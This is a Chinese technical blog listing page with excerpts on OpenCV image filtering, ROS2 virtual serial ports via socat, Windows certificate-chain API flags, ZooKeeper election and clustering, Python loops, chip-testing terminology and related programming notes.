		1、介绍 OpenCV图像处理技术中比较热门的图像滤波操作主要被分为了两大类：线性邻域滤波和非线性滤波。线性邻域滤波常见的有“方框滤波“，”均值滤波“和”高斯滤波“三种，二常见的非线性滤波主要是中值滤波”和“双边滤波”。本文将将简略介绍这几种滤波操作的不同点，以及他们各自的特点。
2、理论与概念讲解 图像滤波，即在尽量保留图像细节特征的条件下对目标图像的噪声进行抑制，是图像预处理中不可缺少的操作，其处理效果的好坏将直接影响到后续图像处理和分析的有效性和可靠性。消除图像中的噪声成分叫作图像的平滑化或滤波操作。信号或图像的能量大部分集中在幅度谱的低频和中频段是很常见的，而在较高频段，感兴趣的信息经常被噪声淹没。因此一个能降低高频成分幅度的滤波器就能够减弱噪声的影响。图像滤波的目的有两个:一是抽出对象的特征作为图像识别的特征模式;另一个是为适应图像处理的要求，消除图像数字化时所混入的噪声。而对滤波处理的要求也有两条:一是不能损坏图像的轮廓及边缘等重要信息;二是使图像清晰视觉效果好。
“平滑处理“（smoothing）也称“模糊处理”（bluring），是一项简单且使用频率很高的图像处理方法。平滑处理的用途有很多，最常见的是用来减少图像上的噪点或者失真。在涉及到降低图像分辨率时，平滑处理是非常好用的方法。平滑滤波是低频增强的空间域滤波技术。它的目的有两类：一类是模糊；另一类是消除噪音。空间域的平滑滤波一般采用简单平均法进行，就是求邻近像元点的平均亮度值。邻域的大小与平滑的效果直接相关，邻域越大平滑的效果越好，但邻域过大，平滑会使边缘信息损失的越大，从而使输出的图像变得模糊，因此需合理选择邻域的大小。关于滤波器，一种形象的比喻法是：我们可以把滤波器想象成一个包含加权系数的窗口，当使用这个滤波器平滑处理图像时，就把这个窗口放到图像之上，透过这个窗口来看我们得到的图像。
2.1、邻域算子与线性邻域滤波 邻域算子（局部算子）是利用给定像素周围的像素值的决定此像素的最终输出值的一种算子。而线性邻域滤波是一种常用的邻域算子，像素的输出值取决于输入像素的加权和，具体过程如下图。邻域算子除了用于局部色调调整以外，还可以用于图像滤波，实现图像的平滑和锐化，图像边缘增强或者图像噪声的去除。本篇文章，我们介绍的主角是线性邻域滤波算子，即用不同的权重去结合一个小邻域内的像素，来得到应有的处理效果。
图注：邻域滤波（卷积）：左边图像与中间图像的卷积产生右边图像。目标图像中蓝色标记的像素是利用原图像中红色标记的像素计算得到的。
线性滤波处理的输出像素值是输入像素值的加权和 :
其中的加权和为 ，我们称其为“核”，滤波器的加权系数，即滤波器的“滤波系数”。
上面的式子可以简单写作：
其中f表示输入像素值，h表示加权系数“核“，g表示输出像素值
2.2、非线性滤波 我们所考虑的滤波器都是线性的，即两个信号之和的响应和他们各自响应之和相等。换句话说，每个像素的输出值是一些输入像素的加权和，线性滤波器易于构造，并且易于从频率响应角度来进行分析。其实在很多情况下，使用邻域像素的非线性滤波也许会得到更好的效果。比如在噪声是散粒噪声而不是高斯噪声，即图像偶尔会出现很大的值的时候。在这种情况下，用高斯滤波器对图像进行模糊的话，噪声像素是不会被去除的，它们只是转换为更为柔和但仍然可见的散粒。
3、线性邻域滤波 3.1、方框滤波（box Filter） boxFilter（）函数方框滤波所用的核为： 其中： 其中f表示原图，h表示核，g表示目标图，当normalize=true的时候，方框滤波就变成了我们熟悉的均值滤波。也就是说，均值滤波是方框滤波归一化（normalized）后的特殊情况。其中，归一化就是把要处理的量都缩放到一个范围内,比如(0,1)，以便统一处理和直观量化。
void boxFilter(InputArray src,OutputArray dst, int ddepth, Size ksize, Point anchor=Point(-1,-1), boolnormalize=true, int borderType=BORDER_DEFAULT )
第一个参数，InputArray类型的src，输入图像，即源图像，填Mat类的对象即可。该函数对通道是独立处理的，且可以处理任意通道数的图片，但需要注意，待处理的图片深度应该为CV_8U, CV_16U, CV_16S, CV_32F 以及 CV_64F之一。第二个参数，OutputArray类型的dst，即目标图像，需要和源图片有一样的尺寸和类型。第三个参数，int类型的ddepth，输出图像的深度，-1代表使用原图深度，即src.depth()。第四个参数，Size类型（对Size类型稍后有讲解）的ksize，内核的大小。一般这样写Size( w,h )来表示内核的大小( 其中，w 为像素宽度， h为像素高度)。Size（3,3）就表示3x3的核大小，Size（5,5）就表示5x5的核大小第五个参数，Point类型的anchor，表示锚点（即被平滑的那个点），注意他有默认值Point(-1,-1)。如果这个点坐标是负值的话，就表示取核的中心为锚点，所以默认值Point(-1,-1)表示这个锚点在核的中心。第六个参数，bool类型的normalize，默认值为true，一个标识符，表示内核是否被其区域归一化（normalized）了。第七个参数，int类型的borderType，用于推断图像外部像素的某种边界模式。有默认值BORDER_DEFAULT，我们一般不去管它。 3.2、均值滤波（blur） 均值滤波，是最简单的一种滤波操作，输出图像的每一个像素是核窗口内输入图像对应像素的像素的平均值( 所有像素加权系数相等)，其实说白了它就是归一化后的方框滤波。均值滤波是典型的线性滤波算法，主要方法为邻域平均法，即用一片图像区域的各个像素的均值来代替原图像中的各个像素值
void blur(InputArray src, OutputArraydst, Size ksize, Point anchor=Point(-1,-1), int borderType=BORDER_DEFAULT )
第一个参数，InputArray类型的src，输入图像，即源图像，填Mat类的对象即可。该函数对通道是独立处理的，且可以处理任意通道数的图片，但需要注意，待处理的图片深度应该为CV_8U, CV_16U, CV_16S, CV_32F 以及 CV_64F之一。第二个参数，OutputArray类型的dst，即目标图像，需要和源图片有一样的尺寸和类型。比如可以用Mat::Clone，以源图片为模板，来初始化得到如假包换的目标图。第三个参数，Size类型（对Size类型稍后有讲解）的ksize，内核的大小。一般这样写Size( w,h )来表示内核的大小( 其中，w 为像素宽度， h为像素高度)。Size（3,3）就表示3x3的核大小，Size（5,5）就表示5x5的核大小第四个参数，Point类型的anchor，表示锚点（即被平滑的那个点），注意他有默认值Point(-1,-1)。如果这个点坐标是负值的话，就表示取核的中心为锚点，所以默认值Point(-1,-1)表示这个锚点在核的中心。第五个参数，int类型的borderType，用于推断图像外部像素的某种边界模式。有默认值BORDER_DEFAULT，我们一般不去管它。 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f34ccd3513d197a85dc907e6e9593748/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3e68a4dd0bb83a2a3c0dbe332d4987b/" rel="bookmark">
			ROS2实现虚拟串口通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.下载demo文件1.1安装python3-serial 2.下载虚拟串口模拟器socat3.串口通信测试3.1代码修改3.2开启uart_example.py3.3开启发送端口dev/pts/23.4进入demo文件夹，使用命令运行python文件3.5发送端口按回车发送，接收端口接收数据 1.下载demo文件 链接:https://github.com/JetsonHacksNano/UARTDemo
1.1安装python3-serial sudo apt-get install python3-serial 2.下载虚拟串口模拟器socat sudo apt-get install socat 输入指令，生成虚拟串口
socat -d -d pty,raw,echo=0 pty,raw,echo=0 虚拟端口号并不固定，在使用完之前都须开启，即终端不能关闭，否则端口号可能发生改变。如下图所示，我这次的虚拟端口号为dev/pts/2和dev/pts/3。
3.串口通信测试 3.1代码修改 由于端口号为dev/pts/2和dev/pts/3，故将其中一个设为发送口一个设为接收口，我将dev/pts/3设为接收口，需要对uart_example.py文件进行修改，修改完如下：
#!/usr/bin/python3 import time import serial print("UART Demonstration Program") print("NVIDIA Jetson Nano Developer Kit") serial_port = serial.Serial( port="/dev/pts/3", baudrate=115200, bytesize=serial.EIGHTBITS, parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, ) #Wait a second to let the port initialize time.sleep(1) try: # Send a simple header serial_port.write("UART Demonstration Program\r\n".encode()) serial_port.write("NVIDIA Jetson Nano Developer Kit\r\n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3e68a4dd0bb83a2a3c0dbe332d4987b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4eb569f2d76a9efe1ef98464416f10f/" rel="bookmark">
			[总结]Windows Crypto API 自动更新根证书问题原因及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： 最近在使用Windows Crypto API 做验签,遇到的一些问题.
问题描述 在调用Windows Crypto API时 发现有网络请求(microsoft/DigiCert等网站)的流量
原因分析： CertGetCertificateChain-&gt;CRYPT32!CChainPathObject::CChainPathObject()这个函数内会进行区分
问题结论 调用Windows Crypto API时存在自动更新根证书 自动访问特定网站下载证书行为.
解决方案： CertGetCertificateChain function (wincrypt.h) 官网解释
dwFlag解释
ValueMeaningCERT_CHAIN_CACHE_END_CERT 0x00000001当这个标志设置,最终证书缓存,这可能会加快正在建设的过程。 默认情况下,最终的证书是不缓存,它需要验证每次链构建。CERT_CHAIN_REVOCATION_CHECK_CACHE_ONLY 0x80000000吊销证书检查只访问缓存的url。CERT_CHAIN_REVOCATION_CHECK_OCSP_CERT 0x04000000这个标志内部使用在链构建一个在线证书状态协议(OCSP)签名者证书,以防止循环吊销证书检查。链建设期间,如果签署的OCSP反应是一个独立的OCSP签名者,然后,除了原来的链构建,还有第二个链构建OCSP签名者证书本身。这个标志这第二个链构建期间用于抑制递归独立OCSP签名者证书。如果签名者证书包含szOID_PKIX_OCSP_NOCHECK扩展,叶签名者证书吊销证书检查被跳过。OCSP和CRL检查都是允许的。 Windows Server 2003和Windows XP:不支持这个值。CERT_CHAIN_CACHE_ONLY_URL_RETRIEVAL 0x00000004只使用缓存的url在构建一个证书链,不会在互联网和内联网搜寻基于URL的对象　注意：这个标志不适用吊销证书检查。缓存设置CERT_CHAIN_REVOCATION_CHECK_CACHE_ONLY只使用url吊销证书检查。CERT_CHAIN_DISABLE_PASS1_QUALITY_FILTERING 0x00000040CERT_CHAIN_DISABLE_MY_PEER_TRUST 0x00000800不支持这个标志。证书在“ＭＹ”证书存储从不考虑同伴的信任。CERT_CHAIN_ENABLE_PEER_TRUST 0x00000400在“TrustedPeople”证书存储的终端实体证书没有执行任何链构建都是可信任的。这个函数不设置CERT_TRUST_IS_PARTIAL_CHAIN或CERT_TRUST_IS_UNTRUSTED_ROOT dwErrorStatus ppChainContext参数的成员。 Windows Server 2003 Windows XP:不支持这个标志。CERT_CHAIN_OPT_IN_WEAK_SIGNATURE 0x00010000设置此标志显示调用者希望选择弱签名检查。 这个标志可以在每个操作系统的汇总更新从Windows 7和Windows Server 2008 R2 开始CERT_CHAIN_RETURN_LOWER_QUALITY_CONTEXTS 0x00000080默认是只返回最高质量链的道路。设置此标志将返回低质量链。这些返回的cLowerQualityChainContext和rgpLowerQualityChainContext字段链上下文。CERT_CHAIN_DISABLE_AUTH_ROOT_AUTO_UPDATE 0x00000100设置这个标志阻止第三方根证书的从Windows更新Web服务器的自动更新CERT_CHAIN_REVOCATION_ACCUMULATIVE_TIMEOUT 0x08000000CERT_CHAIN_TIMESTAMP_TIME 0x00000200这个标志被设置时,pTime作为时间戳时间确定最终的证书是有效的。当前时间也可以用来确定最终证书仍然有效。所有其他认证机构(CA)和根证书链中使用当前时间而不是pTime检查。CERT_CHAIN_DISABLE_AIA 0x00002000设置这个标记显式地关闭 Authority Information Access (AIA)检索。 您还可以设置以下吊销标志,但只有一个标志从这组可以设置一次:
ValueMeaningCERT_CHAIN_REVOCATION_CHECK_END_CERT 0x10000000吊销证书的检查在最终证书,也仅仅是对最终证书CERT_CHAIN_REVOCATION_CHECK_CHAIN 0x20000000吊销证书的检查在所有证书,且在每一个链。CERT_CHAIN_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT 0x40000000吊销证书的检查在所有的所有证书链上进行,除了根证书。 END_CERT:终端实体证书/叶证书/SSL证书
解决方案 主要是在函数的dwFlag上处理
总结 参考:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4eb569f2d76a9efe1ef98464416f10f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f66e0701c679ec78b4fca04d5fd76d3/" rel="bookmark">
			ImageUtils工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.vstsoft.vspn38.basic.util;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
public class ImageUtils {
/**
* 通过BufferedImage图片流调整图片大小
*/
public static BufferedImage resizeImage(BufferedImage originalImage, int targetWidth, int targetHeight) throws IOException {
Image resultingImage = originalImage.getScaledInstance(targetWidth, targetHeight, Image.SCALE_AREA_AVERAGING);
BufferedImage outputImage = new BufferedImage(targetWidth, targetHeight, BufferedImage.TYPE_INT_RGB);
outputImage.getGraphics().drawImage(resultingImage, 0, 0, null);
return outputImage;
}
/** * BufferedImage图片流转byte[]数组 */ public static byte[] imageToBytes(BufferedImage bImage) { ByteArrayOutputStream out = new ByteArrayOutputStream(); try { ImageIO.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f66e0701c679ec78b4fca04d5fd76d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f18f74b1eacfb8844e91fab66856691/" rel="bookmark">
			芯片测试相关术语
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公司计划进入芯片赛道，术语扫盲了。
芯片开发完整流程如下：
1.1 CP测试
CP测试，英文全称Circuit Probing、Chip Probing，也称为晶圆测试，测试对象是针对整片wafer中的每一个Die，目的是确保整片wafer中的每一个Die都能基本满足器件的特征或者设计规格书，通常包括电压、电流、时序和功能的验证。可以用来检测fab厂制造的工艺水平。probe， 探查，查看
CP的难点是如何在最短的时间内挑出坏的die，修补die。
常用到的设备有测试机（IC Tester）、探针台（Prober）以及测试机与探针卡之间的接口（Mechanical Interface）
基本原理是探针加信号激励给pad，然后测试功能。
a.测试对象，wafer芯片，还未封装；
b. 测试目的，筛选，然后决定是否封装。可以节省封装成本（MPW阶段，不需要；fullmask量产阶段，才有节省成本的意义）。
c. 需要保证：基本功能成功即可，主要是机台测试成本高。高速信号不可能，最大支持100~400Mbps；高精度的也不行。总之，通常CP测试，仅仅用于基本的连接测试和低速的数字电路测试
1.2 FT 测试
FT测试，英文全称Final Test，是芯片出厂前的最后一道拦截。测试对象是针对封装好的chip，CP测试之后会进行封装，封装之后进行FT测试。可以用来检测封装厂的工艺水平。
FT测试一般分为两个步骤：1）自动测试设备（ATE）2）系统级别测试（SLT）—2是必须项，1一般小公司可能用不起。ATE测试一般只需要几秒钟；SLT一般需要几个小时，逻辑比较简单。
FT的难点是如何在最短的时间内保证出厂的Unit能够完成全部的功能。FT需要tester（ATE）+ handler + socket。
a. 测试对象，封装后的芯片；
b. 测试目的，筛选，然后决定芯片可用做产品卖给客户。
c. 需要保证：spec指明的全部功能都要验证到。
1.3 WAT 测试
WAT(Wafer Acception Test) 管芯结构性测试
晶圆生产出来后，在出晶圆厂之前，要经过一道电性测试，称为晶圆可接受度测试（WAT）。这个测试是测试在切割道（Scribe Line）上的测试键（TestKey）的电性能。测试键通常设计有各种原件，例如不同尺寸的NMOS、PMOS、电阻、电容以及其他工艺相关的特性。这一道可以当做是初选。那些有严重生产问题从而使得测试键的电性能超出规格之外的晶圆会在这一道被筛选出来，报废掉。这一道报废掉的晶圆，因为还没有出货到客户手里，所以是不收取客户钱的，由晶圆厂自己吸收。
对象：专门的测试图形的测试，结构测试。
cp与ft，量产阶段不重复测相同的项目，一般是跟封装相关的会在ft中测试，避免成本的使用；一般先调试ft，再调试cp
1.爱德万测试机V93K：测试电压14.4V满足测试需求，满足三温卡控（自带板卡）
2. Chroma 3380p：电压10V，只有通过“rowboat”
ATE测试指标：
Stuck at 静态 95%
Transition 加上时序 85%
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5e087bf5bb43b23f83b6119c67f4e1d/" rel="bookmark">
			Python：for循环语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、for循环语法
二、循环的使用 2.1、循环猜年龄
2.2、打印奇偶数
2.3、循环嵌套
三、break &amp; continue
3.1、continue
3.2、break
四、打印三角形
五、while循环
5.1、while语法
5.2、死循环
5.3、循环10次
5.4、python写99乘法表
5.5、用while实现循环猜年龄
六、random和string模块（随机数）
6.1、random模块
6.2、string模块
6.3、京牌摇号小程序
一、for循环语法 for i in range(10): print(i) 上面代码会从0-9，共循环10次，这个range(10)，其实是相当于产生一个从0-9的列表，每循环一次，就会把列表里的下一个元素取出来给临时变量i。
执行结果：
二、循环的使用 2.1、循环猜年龄 需求：最多允许猜三次，猜对了就退出程序
age = 38 for i in range(3): guess = int(input("猜测的年龄：")) if (guess&gt;age): print("猜大了") elif (guess&lt;age): print("猜小了") else: print("猜对了") 2.2、打印奇偶数 打印50-100间的奇数
for i in range(50,100): if (i%2 == 1): print(i) 打印偶数
for i in range(50,100): if (i%2 == 0): print(i) 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5e087bf5bb43b23f83b6119c67f4e1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/422e61325ee3c6e7a576de7e7debd378/" rel="bookmark">
			【SkyWalking问题】skywalking.StatusRuntimeException: UNAVAILABLE，拒绝连接: /x.xxx.xxx.xx:11800
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题描述 ERROR 2022-08-31 12:39:35.331 grpc-default-executor-554 TraceSegmentServiceClient : Send UpstreamSegment to collector fail with a grpc internal exception. org.apache.skywalking.apm.dependencies.io.grpc.StatusRuntimeException: UNAVAILABLE: io exception at org.apache.skywalking.apm.dependencies.io.grpc.Status.asRuntimeException(Status.java:535) at org.apache.skywalking.apm.dependencies.io.grpc.stub.ClientCalls$StreamObserverToCallListenerAdapter.onClose(ClientCalls.java:479) at org.apache.skywalking.apm.dependencies.io.grpc.internal.ClientCallImpl.closeObserver(ClientCallImpl.java:562) at org.apache.skywalking.apm.dependencies.io.grpc.internal.ClientCallImpl.access$300(ClientCallImpl.java:70) at org.apache.skywalking.apm.dependencies.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInternal(ClientCallImpl.java:743) at org.apache.skywalking.apm.dependencies.io.grpc.internal.ClientCallImpl$ClientStreamListenerImpl$1StreamClosed.runInContext(ClientCallImpl.java:722) at org.apache.skywalking.apm.dependencies.io.grpc.internal.ContextRunnable.run(ContextRunnable.java:37) at org.apache.skywalking.apm.dependencies.io.grpc.internal.SerializingExecutor.run(SerializingExecutor.java:133) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) Caused by: org.apache.skywalking.apm.dependencies.io.netty.channel.AbstractChannel$AnnotatedConnectException: 拒绝连接: /x.xxx.xxx.xx:11800 Caused by: java.net.ConnectException: 拒绝连接 at sun.nio.ch.SocketChannelImpl.checkConnect(Native Method) at sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:717) at org.apache.skywalking.apm.dependencies.io.netty.channel.socket.nio.NioSocketChannel.doFinishConnect(NioSocketChannel.java:330) at org.apache.skywalking.apm.dependencies.io.netty.channel.nio.AbstractNioChannel$AbstractNioUnsafe.finishConnect(AbstractNioChannel.java:334) at org.apache.skywalking.apm.dependencies.io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:710) at org.apache.skywalking.apm.dependencies.io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:658) at org.apache.skywalking.apm.dependencies.io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:584) at org.apache.skywalking.apm.dependencies.io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:496) at org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/422e61325ee3c6e7a576de7e7debd378/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dee5a3a5b739e3ebcc717c8d00b3fe6c/" rel="bookmark">
			第十四届华中杯大学生数学建模挑战赛A题Python解答共51批（附文件源码链接）需者自取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题重述：
A 题 分拣系统优化问题 某电商公司配送中心的工作流程分为统计汇总、转运上架、按订单分拣、核对打包等 步骤。其中，分拣环节操作复杂，耗时较长，其效率是影响配送中心整体性能的关键因素。 首先，系统统计汇总出当天全部待配送订单所包含的所有货品及相应数量。然后，转运工 将这些货品由仓库转运至分拣处，并放置到货架上，等待分拣。上架时，一个货架中仅放 置同一种货品。为简化问题，不考虑货架的容积和载重限制，即每个货架能够放置的货品 件数没有限制。最后，分拣工按任务单依次分拣出每一个订单包含的货品。 例如，某天共有 5 个订单，订单的信息如表 1 （原始数据文件格式见附件 1 格式说明） 所示。 表 1 ：订单信息示例 订单编号 所含货品种类及相应数量 D0001 P0001 × 2, P0002 × 1, P0003 × 1, P0004 × 1 D0002 P0003 × 1, P0004 × 1, P0005 × 1, P0006 × 3 D0003 P0001 × 1, P0003 × 1, P0005 × 1, P0007 × 1 D0004 P0002 × 1, P0004 × 1, P0006 × 1, P0008 × 3 D0005 P0001 × 1, P0003 × 2, P0004 × 1, P0007 × 1 系统统计出这 5 个订单共包含 8 种 26 件货品，分别为 4 件 P0001 、 2 件 P0002 、 5 件 P0003 、 4 件 P0004 、 2 件 P0005 、 4 件 P0006 、 2 件 P0007 和 3 件 P0008 。转运工将这些货 品分别放置在 8 个货架上。分拣工根据任务单上的订单信息，依次分拣出每一个订单的货 品。 随着该公司业务量不断增长，未来有可能出现当天待配送订单所含货品种类数大于当 前货架数量 的情况（假设任何一个订单所含货品种类数均小于货架数量 ）。但是， 由于受到场地和成本的限制，很难直接增加货架。该公司希望在你们团队的协助下解决该 问题，并尝试提高分拣效率。具体解决如下问题。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dee5a3a5b739e3ebcc717c8d00b3fe6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e9b39a0e7342a93437c441459817e03/" rel="bookmark">
			Zookeeper leader选举源码分析(超详细)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选举介绍 在开始分析选举的原理之前，先了解几个重要的参数
服务器 ID（myid）
比如有三台服务器，编号分别是 1,2,3。
编号越大在选择算法中的权重越大。
zxid 事务 id-（ZooKeeper transaction ID）
值越大说明数据越新，在选举算法中的权重也越大
逻辑时钟（epoch – logicalclock）
或者叫投票的次数，同一轮投票过程中的逻辑时钟值是相同的。每投完一次票这个数据就会增加，然后与接收到的其它服务器返回的投票信息中的数值相比，根据不同的值做出不同的判断。
选举状态
LOOKING，竞选状态。
FOLLOWING，随从状态，同步 leader 状态，参与投票。
OBSERVING，观察状态,同步 leader 状态，不参与投票。LEADING，领导者状态。
服务器启动时的 leader 选举
每个节点启动的时候状态都是 LOOKING，处于观望状态，接下来就开始进行选主流程。
若进行 Leader 选举，则至少需要两台机器，一般都是选取 3 台机器组成的服务器集群。
（在下面的例子中，为了表述清晰，我们使用两台进行讲解）
在集群初始化阶段，当有一台服务器 Server1 启动时，其单独无法进行和完成 Leader 选举，当第二台服务器 Server2 启动时，此时两台机器可以相互通信，每台机器都试图找到 Leader，于是进入 Leader选举过程。选举过程如下：
(1) 每个 Server 发出一个投票。由于是初始情况，Server1 和 Server2 都会将自己作为 Leader 服务器来进行投票，每次投票会包含所推举的服务器的 myid 和 ZXID、epoch，使用(myid, ZXID,epoch)来表示。
此时 Server1 的投票为(1, 0)，Server2 的投票为(2, 0)，然后各自将这个投票发给集群中其他机器。
(2) 接受来自各个服务器的投票。集群的每个服务器收到投票后，首先判断该投票的有效性，如检查是否是本轮投票（epoch）、是否来自LOOKING 状态的服务器。
(3) 处理投票。针对每一个投票，服务器都需要将别人的投票和自己的投票进行 PK.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e9b39a0e7342a93437c441459817e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cd2b39048628aaba9e1b7849b742e8/" rel="bookmark">
			zookeeper集群部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		伪集群 三份配置文件 #z1.cfg tickTime=2000 initLimit=10 syncLimit=5 dataDir=/Users/twx/code-space/internet/zookeeper-release-3.7.1/quorum/data1 clientPort=2181 server.1=127.0.0.1:2222:2223 server.2=127.0.0.1:3333:3334 server.3=127.0.0.1:4444:4445 #z2.cfg tickTime=2000 initLimit=10 syncLimit=5 dataDir=/Users/twx/code-space/internet/zookeeper-release-3.7.1/quorum/data2 clientPort=2182 server.1=127.0.0.1:2222:2223 server.2=127.0.0.1:3333:3334 server.3=127.0.0.1:4444:4445 #z3.cfg tickTime=2000 initLimit=10 syncLimit=5 dataDir=/Users/twx/code-space/internet/zookeeper-release-3.7.1/quorum/data3 clientPort=2183 server.1=127.0.0.1:2222:2223 server.2=127.0.0.1:3333:3334 server.3=127.0.0.1:4444:4445 创建dataDir目录;并分别echo 1 &gt; data1/myid,echo 2 &gt; data2/myid,echo 3 &gt; data3/myid
启动
./zkServer.sh start ../conf/z1.cfg ./zkServer.sh start ../conf/z2.cfg ./zkServer.sh start ../conf/z3.cfg 真集群 准备quorum.cfg
tickTime=2000 initLimit=10 syncLimit=5 dataDir=/root/zookeeper-3.8.0/quorum/data clientPort=2181 server.1=172.26.1.60:2888:3888 server.2=172.26.1.70:2888:3888 server.3=172.26.1.71:2888:3888 Server.N填上对应的IP地址
将安装包分发至60 70 71（示例）三台服务器
分别在60 70 71创建数据目录和myid文件
mkdir -p /root/zookeeper-3.8.0/quorum/data echo 1 &gt; /root/zookeeper-3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8cd2b39048628aaba9e1b7849b742e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e124584009434b052708401750c8aeb/" rel="bookmark">
			计算机组成原理学习通题目汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章 一. 单选题（共15题，7）
1. (单选题)冯．诺依曼机工作方式的基本特点是（ ）。
A. 多指令流单数据流B. 按地址访问并顺序执行指令C. 堆栈操作D. 存储器按内容选择地址 我的答案: B正确答案: B
2. (单选题)完整的计算机系统应包括（ ）。
A. 运算器、存储器、控制器B. 外设和主机C. 主机和实用程序D. 配套的硬件设备和软件系统 我的答案: D正确答案: D
3. (单选题)计算机的存储系统是指（ ）。
A. RAMB. ROMC. 主存储器D. CACHE、主存储器和辅助存储器 我的答案: D正确答案: D
4. (单选题)计算机硬件能直接执行的只有（ ）。
A. 符号语言B. 机器语言C. 机器语言和汇编语言D. 汇编语言 我的答案: B正确答案: B
5. (单选题)32位微机是指该计算机所用CPU（ ）。
A. 有32位寄存器B. 同时处理32位二进制数C. 有32个寄存器D. 能处理32个字符 我的答案: B正确答案: B
6. (单选题)执行最快的语言是（ ）。
A. 汇编语言B. COBOLC. 机器语言D. C语言 我的答案: C正确答案: C
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e124584009434b052708401750c8aeb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8761b6dd06fe74d4b481517f0b52ddb/" rel="bookmark">
			Android设置color透明度——颜色透明度对照表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 1、xml设置2、Java代码设置3、颜色透明度对照表 1、xml设置 设置其属性:android:background=“#AA9E9E9E”,其中前两位为透明度，后六位为颜色。
2、Java代码设置 View v = findViewById(R.id.content);//找到你要设透明背景的layout 的id v.getBackground().setAlpha(100);//0~255透明度值 ，0为完全 3、颜色透明度对照表 例子：
需求要求：颜色9E9E9E、不透明度40%
最终颜色：#999E9E9E
解释：不透明度40% = 透明度60%，对应透明度60%—99；
从FF开始表示完全不透明，到00表示完全透明。
100% — FF 99% — FC 98% — FA 97% — F7 96% — F5 95% — F2 94% — F0 93% — ED 92% — EB 91% — E8 90% — E6 89% — E3 88% — E0 87% — DE 86% — DB 85% — D9 84% — D6 83% — D4 82% — D1 81% — CF 80% — CC 79% — C9 78% — C7 77% — C4 76% — C2 75% — BF 74% — BD 73% — BA 72% — B8 71% — B5 70% — B3 69% — B0 68% — AD 67% — AB 66% — A8 65% — A6 64% — A3 63% — A1 62% — 9E 61% — 9C 60% — 99 59% — 96 58% — 94 57% — 91 56% — 8F 55% — 8C 54% — 8A 53% — 87 52% — 85 51% — 82 50% — 80 49% — 7D 48% — 7A 47% — 78 46% — 75 45% — 73 44% — 70 43% — 6E 42% — 6B 41% — 69 40% — 66 39% — 63 38% — 61 37% — 5E 36% — 5C 35% — 59 34% — 57 33% — 54 32% — 52 31% — 4F 30% — 4D 29% — 4A 28% — 47 27% — 45 26% — 42 25% — 40 24% — 3D 23% — 3B 22% — 38 21% — 36 20% — 33 19% — 30 18% — 2E 17% — 2B 16% — 29 15% — 26 14% — 24 13% — 21 12% — 1F 11% — 1C 10% — 1A 9% — 17 8% — 14 7% — 12 6% — 0F 5% — 0D 4% — 0A 3% — 08 2% — 05 1% — 03 0% — 00 
	</div>
